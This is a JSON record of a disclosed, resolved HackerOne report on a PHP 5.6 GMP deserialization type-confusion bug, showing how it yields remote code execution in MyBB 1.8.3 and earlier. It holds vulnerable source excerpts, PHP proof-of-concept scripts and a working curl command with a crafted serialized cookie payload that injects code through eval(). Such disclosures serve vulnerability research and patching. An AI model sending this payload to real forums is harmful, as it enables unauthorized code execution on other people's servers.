{"id":198734,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTg3MzQ=","url":"https://hackerone.com/reports/198734","title":"GMP Deserialization Type Confusion Vulnerability [MyBB \u003c= 1.8.3 RCE Vulnerability]","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-01-16T13:37:46.851Z","submitted_at":"2017-01-16T13:37:46.851Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ryat","url":"/ryat","profile_picture_urls":{"small":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/wfyfjk9cawbuzqqdx88azrvxmqt6/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a?response-content-disposition=inline%3B%20filename%3D%22chtg.jpeg%22%3B%20filename%2A%3DUTF-8%27%27chtg.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3ORU3ZNE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045235Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBDRduU%2FQiKN2Hy3Cc%2BFdvYldnR%2BI9yQ0JWu5Nd0q2n7AiBT09NYT9NM%2FNa1T7X7mPFfQEFunNsAbPoVngTqyDCvlCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIMjho0%2F2dG4425KWNaKpEDfRP2JVIKEZKe%2Fu1DRJDnMt1hodmiYRHSHxVJXvZvnhQp68RTbgsA5dtRAFzhCl2p7oJWn2DfsUhN61oqH1cme2ydNbTr6cDG5AkVoiUMnjHvkMPTgbPahrduPs%2FdXuwFoyZMuPeBtzUlpjssIk0BfcIUtph2FGwzCuy6d0CQhdl914kkFpuTBp69z2htWslZiifdNkKWK0DIJcK%2FrSurcsk8WEaPiZ7tEJAcfYZS4SddR8orMY%2BhEfGsLc5RSVBGXY0UW6zTNw%2BYg82wPCY1Z9kgrjwVLQPpVTje3rfzRO3UEDh0xbd54m7t%2FSL0yItTAuaGshQmPLuW6S%2F5KOdoWWnwCmkruRqE1ZKMsnSko5gBnNELay%2BWeukQAQ6EyIB%2FWB06%2F%2FaYfBiWUzjgZyKRGg99IBpEO3zShFTod3huOdptlvO4PfWBvrB4632o9feKKn5CXqJUOE%2BTT%2BgjHEdWRLP2W3GZAibuc%2FbOIfOwee7%2Bn9cOimwp8NVS4U08VlgiSfhcWXonWb3aOkvnOfX46QkwoP6p%2FwU67AFSjWFI11fWgLkInKyx6Dx9AePw1c4qVefioOdfVonnQ3dNW7fXwjlRC5F1185jkAwhyCARy9%2F7sIPFHaI%2FEID5osYCwdvVwv0O6pPIknWS%2FVG7rXxUIgYk0xp3ln2eURcIkz%2F20YEsL73kMrgQLn%2BEd3AiGH%2F9wW5PEZOVPNqagqBYtUSWzNl9%2BrKCkhyVg8k79SdRjUkvdYLXtvxU1m6oAu2IjxFOCgwXqn1jFH1Lloh4Gp%2Fkq68ckYZB67%2B%2FdOzejM9ofYNi%2BpJRLwSwwu22w857sj9E%2BbC8Ei9i7KZOZGBCWe81d9lycwAH6Q%3D%3D\u0026X-Amz-Signature=0ae1ecff5818835c2c07861f897c674fe3d3e55662ecdb1aa62a021e8c28e948"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-10-13T11:11:07.711Z","bug_reporter_agreed_on_going_public_at":"2019-10-13T11:11:07.653Z","team_member_agreed_on_going_public_at":"2019-10-13T09:19:43.606Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"#GMP Deserialization Type Confusion Vulnerability [MyBB \u003c= 1.8.3 RCE Vulnerability]\n\nTaoguang Chen \u003c[@chtg57](https://twitter.com/chtg57)\u003e - Write Date: 2015.4.28\n\n\u003e A type-confusion vulnerability was discovered in GMP deserialization with crafted object's __wakeup() magic method that can be abused for updating any already assigned properties of any already created objects, this result in serious security issues.\n\nAffected Versions\n------------\nAffected is PHP 5.6 \u003c 5.6.30\n\nCredits\n------------\nThis vulnerability was disclosed by Taoguang Chen.\n\nDescription\n------------\ngmp.c\n```\nstatic int gmp_unserialize(zval **object, zend_class_entry *ce, const unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data TSRMLS_DC) /* {{{ */\n{\n\t...\n\tALLOC_INIT_ZVAL(zv_ptr);\n\tif (!php_var_unserialize(\u0026zv_ptr, \u0026p, max, \u0026unserialize_data TSRMLS_CC)\n\t\t|| Z_TYPE_P(zv_ptr) != IS_ARRAY\n\t) {\n\t\tzend_throw_exception(NULL, \"Could not unserialize properties\", 0 TSRMLS_CC);\n\t\tgoto exit;\n\t}\n\n\tif (zend_hash_num_elements(Z_ARRVAL_P(zv_ptr)) != 0) {\n\t\tzend_hash_copy(\n\t\t\tzend_std_get_properties(*object TSRMLS_CC), Z_ARRVAL_P(zv_ptr),\n\t\t\t(copy_ctor_func_t) zval_add_ref, NULL, sizeof(zval *)\n\t\t);\n\t}\n```\n\nzend_object_handlers.c\n```\nZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */\n{\n\tzend_object *zobj;\n\tzobj = Z_OBJ_P(object);\n\tif (!zobj-\u003eproperties) {\n\t\trebuild_object_properties(zobj);\n\t}\n\treturn zobj-\u003eproperties;\n}\n```\n\nIt has been demonstrated many times before that __wakeup() or other magic methods leads to ZVAL was changed from the memory in during deserializtion. So an attacker can change **object into an integer-type or bool-type ZVAL, then the attacker will be able to access any objects that stored in objects store via Z_OBJ_P. This means the attacker will be able to update any properties in the object via zend_hash_copy(). It is possible to lead to various problems and including security issues.\n\nThe following codes will prove this vulnerability:\n```\n\u003c?php\n\nclass obj\n{\n\tvar $ryat;\n\t\n\tfunction __wakeup()\n\t{\n\t\t$this-\u003eryat = 1;\n\t}\n}\n\n$obj = new stdClass;\n$obj-\u003eaa = 1;\n$obj-\u003ebb = 2;\n\n$inner = 's:1:\"1\";a:3:{s:2:\"aa\";s:2:\"hi\";s:2:\"bb\";s:2:\"hi\";i:0;O:3:\"obj\":1:{s:4:\"ryat\";R:2;}}';\n$exploit = 'a:1:{i:0;C:3:\"GMP\":'.strlen($inner).':{'.$inner.'}}';\n$x = unserialize($exploit);\nvar_dump($obj);\n\n?\u003e\n```\n\nExpected result:\n```\nobject(stdClass)#1 (2) {\n  [\"aa\"]=\u003e\n  int(1)\n  [\"bb\"]=\u003e\n  int(2)\n}\n```\n\nActual result:\n```\nobject(stdClass)#1 (3) {\n  [\"aa\"]=\u003e\n  string(2) \"hi\"\n  [\"bb\"]=\u003e\n  string(2) \"hi\"\n  [0]=\u003e\n  object(obj)#3 (1) {\n    [\"ryat\"]=\u003e\n    \u0026int(1)\n  }\n}\n```\n\ni) How to exploited this bug in real world?\nOn php 5.6 \u003c= 5.6.11, DateInterval's __wakeup() use convert_to_long() handles and reassignments its properties (it has been demonstrated many times), so an attacker can convert GMP object to an any integer-type ZVAL via GMP's gmp_cast_object():\n\n```\nstatic int gmp_cast_object(zval *readobj, zval *writeobj, int type TSRMLS_DC) /* {{{ */\n{\n    mpz_ptr gmpnum;\n    switch (type) {\n    ...\n    case IS_LONG:\n        gmpnum = GET_GMP_FROM_ZVAL(readobj);\n        INIT_PZVAL(writeobj);\n        ZVAL_LONG(writeobj, mpz_get_si(gmpnum));\n        return SUCCESS;\n```\n\nThe following codes will prove this exploite way:\n```\n\u003c?php\n\nvar_dump(unserialize('a:2:{i:0;C:3:\"GMP\":17:{s:4:\"1234\";a:0:{}}i:1;O:12:\"DateInterval\":1:{s:1:\"y\";R:2;}}'));\n\n?\u003e\n```\nOf course, a crafted __wakeup() can also be exploited, ex:\n\n```\n\u003c?php\n\nfunction __wakeup()\n{\n    $this-\u003eryat = (int) $this-\u003eryat;\n}\n\n?\u003e\n```\n\nii) Can be exploited this bug in real app?\n\nOn MyBB \u003c= 1.8.3:\n\nindex.php\n```\n\tif(isset($mybb-\u003ecookies['mybb']['forumread']))\n\t{\n\t\t$forumsread = my_unserialize($mybb-\u003ecookies['mybb']['forumread']);\n\t}\n```\n\nMyBB \u003c= 1.8.3 allow deserialized cookies via unserialize(), so an attacker will be able to update $mybb or other object's any properties, and it is possible to lead to security issues easily, ex: xss, sql injection, remote code execution and etc. :-)\n\nP.S. I had reported this vulnerability and it had been fixed in mybb \u003e= 1.8.4.\n\nProof of Concept Exploit\n------------\nMyBB \u003c= 1.8.3 RCE vulnerability\n\nindex.php\n```\neval('$index = \"'.$templates-\u003eget('index').'\";');\n```\n\nMyBB always use eval() function in during template parsing.\n\ninc/class_templates.php\n```\nclass templates\n{\n\t...\n\tpublic $cache = array();\n\t...\n\tfunction get($title, $eslashes=1, $htmlcomments=1)\n\t{\n\t\tglobal $db, $theme, $mybb;\n\t\t...\n\t\t$template = $this-\u003ecache[$title];\n\t\t...\n\t\treturn $template;\n\t}\n```\n\nIf we can control the `$cache`, we will be albe to inject php code via eval() function.\n\ninc/init.php\n```\n$error_handler = new errorHandler();\n...\n$maintimer = new timer();\n...\n$mybb = new MyBB;\n...\nswitch($config['database']['type'])\n{\n\tcase \"sqlite\":\n\t\t$db = new DB_SQLite;\n\t\tbreak;\n\tcase \"pgsql\":\n\t\t$db = new DB_PgSQL;\n\t\tbreak;\n\tcase \"mysqli\":\n\t\t$db = new DB_MySQLi;\n\t\tbreak;\n\tdefault:\n\t\t$db = new DB_MySQL;\n}\n...\n$templates = new templates;\n```\n\nThe `$templates` object was instantiated in init.php, and four objects was instantiated in this before. This means the `$templates` object's handle was set to 5 and stored into objects store, so we can access the `$templates` object and update the `$cache` property via convert GMP object into integer-type ZVAL that value is 5 in during GMP deserialization. This also means we can inject php code via eval() function.\n\nWhen MyBB \u003c= 1.8.3 and PHP5.6 \u003c= 5.6.11, remote code execution by just using curl on the command line:\n```\ncurl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:\"GMP\":106:{s:1:\"5\"%3ba:2:{s:5:\"cache\"%3ba:1:{s:5:\"index\"%3bs:14:\"{${phpinfo()}}\"%3b}i:0%3bO:12:\"DateInterval\":1:{s:1:\"y\"%3bR:2%3b}}}}' http://127.0.0.1/mybb/\n```","vulnerability_information_html":"\u003ch1 id=\"gmp-deserialization-type-confusion-vulnerability-mybb-1-8-3-rce-vulnerability\"\u003eGMP Deserialization Type Confusion Vulnerability [MyBB \u0026lt;= 1.8.3 RCE Vulnerability]\u003c/h1\u003e\n\n\u003cp\u003eTaoguang Chen \u0026lt;\u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fchtg57\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e@chtg57\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026gt; - Write Date: 2015.4.28\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eA type-confusion vulnerability was discovered in GMP deserialization with crafted object\u0026#39;s __wakeup() magic method that can be abused for updating any already assigned properties of any already created objects, this result in serious security issues.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"affected-versions\"\u003eAffected Versions\u003c/h2\u003e\n\n\u003cp\u003eAffected is PHP 5.6 \u0026lt; 5.6.30\u003c/p\u003e\n\n\u003ch2 id=\"credits\"\u003eCredits\u003c/h2\u003e\n\n\u003cp\u003eThis vulnerability was disclosed by Taoguang Chen.\u003c/p\u003e\n\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003egmp.c\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003estatic int gmp_unserialize(zval **object, zend_class_entry *ce, const unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data TSRMLS_DC) /* {{{ */\n{\n    ...\n    ALLOC_INIT_ZVAL(zv_ptr);\n    if (!php_var_unserialize(\u0026amp;zv_ptr, \u0026amp;p, max, \u0026amp;unserialize_data TSRMLS_CC)\n        || Z_TYPE_P(zv_ptr) != IS_ARRAY\n    ) {\n        zend_throw_exception(NULL, \u0026quot;Could not unserialize properties\u0026quot;, 0 TSRMLS_CC);\n        goto exit;\n    }\n\n    if (zend_hash_num_elements(Z_ARRVAL_P(zv_ptr)) != 0) {\n        zend_hash_copy(\n            zend_std_get_properties(*object TSRMLS_CC), Z_ARRVAL_P(zv_ptr),\n            (copy_ctor_func_t) zval_add_ref, NULL, sizeof(zval *)\n        );\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ezend_object_handlers.c\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */\n{\n    zend_object *zobj;\n    zobj = Z_OBJ_P(object);\n    if (!zobj-\u0026gt;properties) {\n        rebuild_object_properties(zobj);\n    }\n    return zobj-\u0026gt;properties;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt has been demonstrated many times before that __wakeup() or other magic methods leads to ZVAL was changed from the memory in during deserializtion. So an attacker can change **object into an integer-type or bool-type ZVAL, then the attacker will be able to access any objects that stored in objects store via Z_OBJ_P. This means the attacker will be able to update any properties in the object via zend_hash_copy(). It is possible to lead to various problems and including security issues.\u003c/p\u003e\n\n\u003cp\u003eThe following codes will prove this vulnerability:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eobj\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003evar\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ryat\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003e__wakeup\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$this\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003eryat\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$obj\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"k\"\u003estdClass\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$obj\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003eaa\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$obj\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003ebb\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$inner\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;s:1:\u0026quot;1\u0026quot;;a:3:{s:2:\u0026quot;aa\u0026quot;;s:2:\u0026quot;hi\u0026quot;;s:2:\u0026quot;bb\u0026quot;;s:2:\u0026quot;hi\u0026quot;;i:0;O:3:\u0026quot;obj\u0026quot;:1:{s:4:\u0026quot;ryat\u0026quot;;R:2;}}\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$exploit\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;a:1:{i:0;C:3:\u0026quot;GMP\u0026quot;:\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$inner\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:{\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$inner\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;}}\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$x\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eunserialize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$exploit\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003evar_dump\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$obj\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eExpected result:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eobject(stdClass)#1 (2) {\n  [\u0026quot;aa\u0026quot;]=\u0026gt;\n  int(1)\n  [\u0026quot;bb\u0026quot;]=\u0026gt;\n  int(2)\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eActual result:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eobject(stdClass)#1 (3) {\n  [\u0026quot;aa\u0026quot;]=\u0026gt;\n  string(2) \u0026quot;hi\u0026quot;\n  [\u0026quot;bb\u0026quot;]=\u0026gt;\n  string(2) \u0026quot;hi\u0026quot;\n  [0]=\u0026gt;\n  object(obj)#3 (1) {\n    [\u0026quot;ryat\u0026quot;]=\u0026gt;\n    \u0026amp;int(1)\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ei) How to exploited this bug in real world?\u003cbr\u003e\nOn php 5.6 \u0026lt;= 5.6.11, DateInterval\u0026#39;s __wakeup() use convert_to_long() handles and reassignments its properties (it has been demonstrated many times), so an attacker can convert GMP object to an any integer-type ZVAL via GMP\u0026#39;s gmp_cast_object():\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003estatic int gmp_cast_object(zval *readobj, zval *writeobj, int type TSRMLS_DC) /* {{{ */\n{\n    mpz_ptr gmpnum;\n    switch (type) {\n    ...\n    case IS_LONG:\n        gmpnum = GET_GMP_FROM_ZVAL(readobj);\n        INIT_PZVAL(writeobj);\n        ZVAL_LONG(writeobj, mpz_get_si(gmpnum));\n        return SUCCESS;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe following codes will prove this exploite way:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003evar_dump\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eunserialize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;a:2:{i:0;C:3:\u0026quot;GMP\u0026quot;:17:{s:4:\u0026quot;1234\u0026quot;;a:0:{}}i:1;O:12:\u0026quot;DateInterval\u0026quot;:1:{s:1:\u0026quot;y\u0026quot;;R:2;}}\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOf course, a crafted __wakeup() can also be exploited, ex:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003e__wakeup\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$this\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003eryat\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nv\"\u003e$this\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003eryat\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eii) Can be exploited this bug in real app?\u003c/p\u003e\n\n\u003cp\u003eOn MyBB \u0026lt;= 1.8.3:\u003c/p\u003e\n\n\u003cp\u003eindex.php\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    if(isset($mybb-\u0026gt;cookies[\u0026#39;mybb\u0026#39;][\u0026#39;forumread\u0026#39;]))\n    {\n        $forumsread = my_unserialize($mybb-\u0026gt;cookies[\u0026#39;mybb\u0026#39;][\u0026#39;forumread\u0026#39;]);\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eMyBB \u0026lt;= 1.8.3 allow deserialized cookies via unserialize(), so an attacker will be able to update $mybb or other object\u0026#39;s any properties, and it is possible to lead to security issues easily, ex: xss, sql injection, remote code execution and etc. :-)\u003c/p\u003e\n\n\u003cp\u003eP.S. I had reported this vulnerability and it had been fixed in mybb \u0026gt;= 1.8.4.\u003c/p\u003e\n\n\u003ch2 id=\"proof-of-concept-exploit\"\u003eProof of Concept Exploit\u003c/h2\u003e\n\n\u003cp\u003eMyBB \u0026lt;= 1.8.3 RCE vulnerability\u003c/p\u003e\n\n\u003cp\u003eindex.php\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eeval(\u0026#39;$index = \u0026quot;\u0026#39;.$templates-\u0026gt;get(\u0026#39;index\u0026#39;).\u0026#39;\u0026quot;;\u0026#39;);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eMyBB always use eval() function in during template parsing.\u003c/p\u003e\n\n\u003cp\u003einc/class_templates.php\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eclass templates\n{\n    ...\n    public $cache = array();\n    ...\n    function get($title, $eslashes=1, $htmlcomments=1)\n    {\n        global $db, $theme, $mybb;\n        ...\n        $template = $this-\u0026gt;cache[$title];\n        ...\n        return $template;\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf we can control the \u003ccode\u003e$cache\u003c/code\u003e, we will be albe to inject php code via eval() function.\u003c/p\u003e\n\n\u003cp\u003einc/init.php\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$error_handler = new errorHandler();\n...\n$maintimer = new timer();\n...\n$mybb = new MyBB;\n...\nswitch($config[\u0026#39;database\u0026#39;][\u0026#39;type\u0026#39;])\n{\n    case \u0026quot;sqlite\u0026quot;:\n        $db = new DB_SQLite;\n        break;\n    case \u0026quot;pgsql\u0026quot;:\n        $db = new DB_PgSQL;\n        break;\n    case \u0026quot;mysqli\u0026quot;:\n        $db = new DB_MySQLi;\n        break;\n    default:\n        $db = new DB_MySQL;\n}\n...\n$templates = new templates;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003e$templates\u003c/code\u003e object was instantiated in init.php, and four objects was instantiated in this before. This means the \u003ccode\u003e$templates\u003c/code\u003e object\u0026#39;s handle was set to 5 and stored into objects store, so we can access the \u003ccode\u003e$templates\u003c/code\u003e object and update the \u003ccode\u003e$cache\u003c/code\u003e property via convert GMP object into integer-type ZVAL that value is 5 in during GMP deserialization. This also means we can inject php code via eval() function.\u003c/p\u003e\n\n\u003cp\u003eWhen MyBB \u0026lt;= 1.8.3 and PHP5.6 \u0026lt;= 5.6.11, remote code execution by just using curl on the command line:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl --cookie \u0026#39;mybb[forumread]=a:1:{i:0%3bC:3:\u0026quot;GMP\u0026quot;:106:{s:1:\u0026quot;5\u0026quot;%3ba:2:{s:5:\u0026quot;cache\u0026quot;%3ba:1:{s:5:\u0026quot;index\u0026quot;%3bs:14:\u0026quot;{${phpinfo()}}\u0026quot;%3b}i:0%3bO:12:\u0026quot;DateInterval\u0026quot;:1:{s:1:\u0026quot;y\u0026quot;%3bR:2%3b}}}}\u0026#39; http://127.0.0.1/mybb/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:19:43.677Z","allow_singular_disclosure_after":-35667171.49155218,"singular_disclosure_allowed":true,"vote_count":64,"voters":["jbreed","sameerphad72","xingguang","geeknik","jackb898","xaleraf4ra","ryat","tarwadahorse","smodnix","paulos_","and 54 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1422766,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The bug report at: https://bugs.php.net/bug.php?id=70513","markdown_message":"\u003cp\u003eThe bug report at: \u003ca title=\"https://bugs.php.net/bug.php?id=70513\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D70513\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=70513\u003c/span\u003e\u003ci 